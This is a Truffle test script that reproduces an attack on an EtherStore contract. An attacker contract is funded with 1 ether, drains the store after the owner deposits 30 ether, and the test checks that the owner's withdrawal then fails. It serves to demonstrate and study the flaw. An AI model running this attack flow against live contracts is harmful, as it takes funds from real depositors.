const truffleAssert = require("truffle-assertions");
const EtherStore = artifacts.require("EtherStore");
const AttackerStore = artifacts.require("AttackerStore");

contract("Repro", accounts => {
    const ownerEOA = accounts[1];
    const attackerEOA = accounts[2];

    it("Repro", async () => {
        let ethStore = await EtherStore.deployed();
        let attackerStore = await AttackerStore.deployed();

        console.log("--- initial state ---");
        console.log(
            "Owner EOA    , initial balance = " +
                web3.utils.fromWei(await web3.eth.getBalance(ownerEOA), "ether")
        );
        console.log(
            "Attacker EOA , initial balance = " +
                web3.utils.fromWei(
                    await web3.eth.getBalance(attackerEOA),
                    "ether"
                )
        );

        console.log("-- Owner deposits 30 ether to EthStore --");
        await ethStore.depositFunds.sendTransaction({
            value: web3.utils.toWei("30", "ether"),
            from: ownerEOA
        });
        console.log(
            "Owner EOA    , after deposit   = " +
                web3.utils.fromWei(await web3.eth.getBalance(ownerEOA), "ether")
        );
        console.log(
            "EthStore     , after deposit   = " +
                web3.utils.fromWei(
                    await web3.eth.getBalance(ethStore.address),
                    "ether"
                )
        );
        console.log(
            "AttackerStore, after deposit   = " +
                web3.utils.fromWei(
                    await web3.eth.getBalance(attackerStore.address),
                    "ether"
                )
        );

        console.log(
            "-- Commence an attack by attacker to send 1 eth to AttackerStore --"
        );
        await attackerStore.attackEtherStore.sendTransaction({
            value: web3.utils.toWei("1", "ether"),
            from: attackerEOA
        });
        console.log(
            "Attacker     , after attack    = " +
                web3.utils.fromWei(
                    await web3.eth.getBalance(attackerEOA),
                    "ether"
                )
        );
        console.log(
            "EthStore     , after attack    = " +
                web3.utils.fromWei(
                    await web3.eth.getBalance(ethStore.address),
                    "ether"
                )
        );
        console.log(
            "AttackerStore, after deposit   = " +
                web3.utils.fromWei(
                    await web3.eth.getBalance(attackerStore.address),
                    "ether"
                )
        );
        console.log("-- The attacker to collect eth from AttackerStore --");
        await attackerStore.collectEther.sendTransaction({ from: attackerEOA });
        console.log(
            "Attacker     , after collect   = " +
                web3.utils.fromWei(
                    await web3.eth.getBalance(attackerEOA),
                    "ether"
                )
        );
        console.log(
            "EthStore     , after collect   = " +
                web3.utils.fromWei(
                    await web3.eth.getBalance(ethStore.address),
                    "ether"
                )
        );
        console.log(
            "AttackerStore, after collect   = " +
                web3.utils.fromWei(
                    await web3.eth.getBalance(attackerStore.address),
                    "ether"
                )
        );
        console.log("-- Owner is no longer able to withdraw his/her eth. --");
        await truffleAssert.reverts(
            ethStore.withdrawFunds.sendTransaction(
                web3.utils.toWei("5", "ether"),
                { from: ownerEOA }
            )
        );
    });
});
